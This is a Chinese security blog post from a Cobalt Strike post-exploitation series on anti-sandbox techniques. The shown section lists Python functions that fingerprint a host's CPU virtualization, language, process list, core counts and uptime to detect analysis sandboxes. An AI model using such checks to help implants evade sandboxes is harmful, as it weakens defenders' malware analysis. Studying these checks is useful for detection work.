
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
  
  <meta name="generator" content="Hexo 7.3.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" content="#f8f8f8">
  
  <title>CS-反沙箱杂谈 - SafeKiller Zone</title>

  
    <meta name="description" content="总字符数: 43.55K                代码: 40.25K, 文本: 1.89K               预计阅读时间: 3.05 小时            获取沙箱环境检查CPU是否支持虚拟化123456789101112131415161718192021222324def check_cpu_virtualization():    try:">
<meta property="og:type" content="article">
<meta property="og:title" content="CS-反沙箱杂谈">
<meta property="og:url" content="https://jiangjiyue.github.io/2024/11/07/c9983715/index.html">
<meta property="og:site_name" content="SafeKiller Zone">
<meta property="og:description" content="总字符数: 43.55K                代码: 40.25K, 文本: 1.89K               预计阅读时间: 3.05 小时            获取沙箱环境检查CPU是否支持虚拟化123456789101112131415161718192021222324def check_cpu_virtualization():    try:">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301085.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301181.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301302.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301545.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301694.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301853.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301704.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301387.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301611.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071302087.png">
<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071302968.png">
<meta property="article:published_time" content="2024-11-07T04:59:49.000Z">
<meta property="article:modified_time" content="2024-11-07T11:51:58.000Z">
<meta property="article:author" content="Kill3r">
<meta property="article:tag" content="Cobalt Strike">
<meta property="article:tag" content="后渗透">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071301085.png">
  
  
  
  <meta name="keywords" content="Cobalt Strike,后渗透">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.27.0">

  
    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
  

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
</div>
<div class="widgets">
<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：Cobalt Strike</span></div><div class="widget-body"><a class="item" href="/2024/09/24/3c3f9499/"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="/2024/09/25/3c3f9499/"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="/2024/09/26/da146604/"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/10/28/ce454855/"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item active" href="/2024/11/07/c9983715/"><span class="title">CS-反沙箱杂谈</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/11/15/d30120c3/"><span class="title">CS-高级执行方式</span></a></div></widget>

<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/02/16/449cb93/"><span class="title">Security-主动信息收集</span></a><a class="item title" href="/2024/02/14/dbeaca23/"><span class="title">Security-被动信息收集</span></a><a class="item title" href="/2024/07/04/dd58c5ed/"><span class="title">应急响应之Wireshark流量分析</span></a><a class="item title" href="/2024/07/06/9e820566/"><span class="title">应急响应之日志分析</span></a><a class="item title" href="/2024/02/12/7564e3ff/"><span class="title">Security-全方位探索网络安全</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/09/24/3c3f9499/">Cobalt Strike</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-11-07T04:59:49.000Z">2024-11-07</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-11-07T11:51:58.000Z">2024-11-07</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>CS-反沙箱杂谈</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
    <p>总字符数: 43.55K </p>
    </div>
    <div class="cell" style="">
    <p>代码: 40.25K, 文本: 1.89K</p>
    </div>
    <div class="cell" style="">
    <p>预计阅读时间: 3.05 小时</p>
    </div>
    </div>

<h2 id="获取沙箱环境"><a href="#获取沙箱环境" class="headerlink" title="获取沙箱环境"></a>获取沙箱环境</h2><h3 id="检查CPU是否支持虚拟化"><a href="#检查CPU是否支持虚拟化" class="headerlink" title="检查CPU是否支持虚拟化"></a>检查CPU是否支持虚拟化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_cpu_virtualization</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建WMI对象，用于访问系统的管理信息</span></span><br><span class="line">        <span class="comment"># https://medium.com/@marcovit87/pywin32-and-wmi-windows-mangement-instrumentation-navigating-windows-os-with-python-4a73bfcce59a</span></span><br><span class="line">        c = wmi.WMI()</span><br><span class="line">        <span class="comment"># 初始化虚拟化信息和处理器名称的变量</span></span><br><span class="line">        virtualization_info = <span class="string">&quot;未能检索虚拟化信息&quot;</span></span><br><span class="line">        processor_name = <span class="string">&quot;未知处理器&quot;</span></span><br><span class="line">        <span class="comment"># 遍历系统中的所有处理器，通过WMI访问Win32_Processor类</span></span><br><span class="line">        <span class="keyword">for</span> processor <span class="keyword">in</span> c.Win32_Processor():</span><br><span class="line">            <span class="comment"># 获取处理器的名称</span></span><br><span class="line">            processor_name = processor.Name</span><br><span class="line">            <span class="comment"># 检查处理器是否具有VirtualizationFirmwareEnabled属性</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(processor, <span class="string">&quot;VirtualizationFirmwareEnabled&quot;</span>):</span><br><span class="line">                <span class="comment"># 如果有该属性，则处理器支持虚拟化，获取其值</span></span><br><span class="line">                virtualization_info = <span class="string">f&quot;支持虚拟化: <span class="subst">&#123;processor.VirtualizationFirmwareEnabled&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果没有该属性，则处理器不支持虚拟化</span></span><br><span class="line">                virtualization_info = <span class="string">&quot;处理器不支持虚拟化&quot;</span></span><br><span class="line">        <span class="comment"># 返回处理器名称和虚拟化信息的组合字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;处理器: <span class="subst">&#123;processor_name&#125;</span>\n<span class="subst">&#123;virtualization_info&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在处理过程中发生异常，捕获并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking CPU virtualization: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取系统语言"><a href="#获取系统语言" class="headerlink" title="获取系统语言"></a>获取系统语言</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_language</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 调用 Windows API 函数 GetUserDefaultUILanguage 以获取当前用户的默认UI语言ID</span></span><br><span class="line">        <span class="comment"># 使用 ctypes.windll 来访问 kernel32.dll 并调用其导出函数</span></span><br><span class="line">        lang_id = ctypes.windll.kernel32.GetUserDefaultUILanguage()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 格式化返回的语言ID为十六进制字符串，并返回结果</span></span><br><span class="line">        <span class="comment"># 格式化字符串 &#x27;#04x&#x27; 将整数转换为四位的十六进制格式，前面带有 &quot;0x&quot;</span></span><br><span class="line">        <span class="comment"># https://winprotocoldocs-bhdugrdyduf5h2e4.b02.azurefd.net/MS-LCID/%5bMS-LCID%5d.pdf</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;语言ID: <span class="subst">&#123;lang_id:#04x&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取语言ID的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking language: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取进程信息"><a href="#获取进程信息" class="headerlink" title="获取进程信息"></a>获取进程信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_process_count</span>():</span><br><span class="line">    process_list = <span class="string">&quot;\n=== 进程列表 ===\n&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 创建一个 WMI 客户端对象，用于访问系统的管理信息</span></span><br><span class="line">        <span class="comment"># 通过 win32com.client 的 GetObject 方法连接到 WMI 服务</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        <span class="comment"># 通过调用 InstancesOf 方法获取当前系统中所有运行的进程实例</span></span><br><span class="line">        <span class="comment"># &quot;Win32_Process&quot; 是一个 WMI 类，表示系统中的进程</span></span><br><span class="line">        process_instances = wmi_client.InstancesOf(<span class="string">&quot;Win32_Process&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算当前运行的进程的数量</span></span><br><span class="line">        process_list += <span class="string">f&quot;进程数量:<span class="subst">&#123;<span class="built_in">len</span>(process_instances)&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="keyword">for</span> process <span class="keyword">in</span> process_instances:</span><br><span class="line">            process_list += <span class="string">f&quot;进程名称: <span class="subst">&#123;process.Name&#125;</span>, PID: <span class="subst">&#123;process.ProcessId&#125;</span>\n&quot;</span></span><br><span class="line">        <span class="comment"># 返回进程数量的信息字符串</span></span><br><span class="line">        <span class="keyword">return</span> process_list</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在获取进程数量的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking process count: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="获取CPU信息"><a href="#获取CPU信息" class="headerlink" title="获取CPU信息"></a>获取CPU信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cpu_info</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 win32com.client 来访问 Windows WMI 服务</span></span><br><span class="line">        <span class="comment"># 获取一个 WMI 客户端对象，这样可以通过 WMI 查询获取系统信息</span></span><br><span class="line">        wmi_client = win32com.client.GetObject(<span class="string">&quot;winmgmts:&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 WMI 查询 &quot;Win32_Processor&quot; 类来获取处理器信息</span></span><br><span class="line">        <span class="comment"># 通过生成器表达式计算查询结果中的处理器数量</span></span><br><span class="line">        cpu_count = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> wmi_client.ExecQuery(<span class="string">&quot;Select * from Win32_Processor&quot;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 psutil 库获取物理核心数和逻辑处理器数</span></span><br><span class="line">        <span class="comment"># 返回一个格式化字符串，包含CPU数量、物理核心数和逻辑处理器数</span></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="string">f&quot;CPU数量: <span class="subst">&#123;cpu_count&#125;</span>\n&quot;</span>  <span class="comment"># 从 WMI 获取的CPU数量</span></span><br><span class="line">            <span class="string">f&quot;CPU物理核心: <span class="subst">&#123;psutil.cpu_count(logical=<span class="literal">False</span>)&#125;</span>\n&quot;</span>  <span class="comment"># 物理核心数，不包括超线程逻辑核心</span></span><br><span class="line">            <span class="string">f&quot;CPU逻辑数量: <span class="subst">&#123;psutil.cpu_count()&#125;</span>\n&quot;</span>  <span class="comment"># 总逻辑处理器数，包括超线程</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在任何一步发生异常，捕获异常并返回包含错误信息的字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking CPU count: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="获取开机时间"><a href="#获取开机时间" class="headerlink" title="获取开机时间"></a>获取开机时间</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_start_time</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用 psutil 模块的 boot_time() 函数获取系统的启动时间</span></span><br><span class="line">        <span class="comment"># boot_time() 返回的是自 Unix 纪元以来的秒数，表示系统启动的时间</span></span><br><span class="line">        uptime = psutil.boot_time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用 time 模块的 time() 函数获取当前的时间</span></span><br><span class="line">        <span class="comment"># time() 返回的是当前时间自 Unix 纪元以来的秒数</span></span><br><span class="line">        current_time = time.time()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算系统的运行时间（以分钟为单位）</span></span><br><span class="line">        <span class="comment"># 当前时间减去启动时间获取系统的运行时间（秒），再除以60转换为分钟</span></span><br><span class="line">        <span class="comment"># 使用格式化字符串将时间格式化为保留两位小数的浮点数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;开机时间: <span class="subst">&#123;(current_time - uptime) / <span class="number">60</span>:<span class="number">.2</span>f&#125;</span>分钟\n&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 如果在计算开机时间的过程中出现异常，捕获异常并返回错误信息</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error checking start time: <span class="subst">&#123;e&#125;</span>\n&quot;</span></span><br></pre></td></tr></table></figure>

